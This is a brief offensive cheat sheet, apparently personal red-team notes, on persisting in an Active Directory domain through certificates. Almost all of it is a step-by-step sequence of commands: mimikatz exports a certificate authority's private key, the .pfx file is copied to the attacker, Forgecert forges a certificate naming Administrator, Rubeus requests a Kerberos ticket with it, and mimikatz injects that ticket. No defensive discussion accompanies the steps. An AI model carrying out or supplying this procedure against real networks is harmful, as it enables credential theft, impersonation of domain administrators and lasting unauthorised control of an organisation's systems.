# AD CERTIFICATES PERSISTENCE

### Tools: mimikatz, SharpDPAPI

## Extract Private Key

#### 1) 

    mimikatz

#### 2) 

    crypto::certificates /systemstore:LOCAL_MACHINE

#### 3) 

    privilege::debug

#### 4) 

    crypto::capi 

#### 5) 

    crypto::cng

#### 6) 

    crypto::certificates /systemstore:LOCAL_MACHINE /export

## Exported Certificates format: PFX and DER

#### 7) Download/copy .pfx file to attacker, then SCP to low-privileged user's home directory (Default key pass: mimikatz)

## Generate our own certificate

### Tools: Forgecert, Rubeus, Mimikatz

#### 8) 

    Forgecert.exe --CaCertPath /path/to/.pfx --CaCertPassword mimikatz --Subject CN=(WHATEVER) --SubjectAltName Administrator@DOMAIN --NewCertPath /path/to/forged.pfx --NewCertPassword PASSWORD

#### 9) 

    Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:/path/to/forged.pfx /password:CERT_PASS /outfile:TICKET.KIRBI /domain:DOMAIN /dc:DC_IP

#### 10) 

    mimikatz

#### 11) 

    kerberos::ptt TICKET.KIRBI

#### 12) 

    exit
